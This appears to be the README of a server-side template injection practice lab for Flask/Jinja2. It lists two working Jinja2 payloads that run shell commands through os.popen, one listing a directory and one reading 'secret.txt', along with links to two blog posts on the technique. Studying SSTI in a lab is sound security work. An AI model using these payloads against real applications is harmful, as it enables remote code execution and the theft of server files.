# ssti_simulator

## Remote Code Execution through SSTI request.application
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

{{ request.application.__globals__.__builtins__.__import__('os').popen('cat secret.txt').read() }}

## Remote Code Exection through SSTI String class eg: `"".__class__`
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
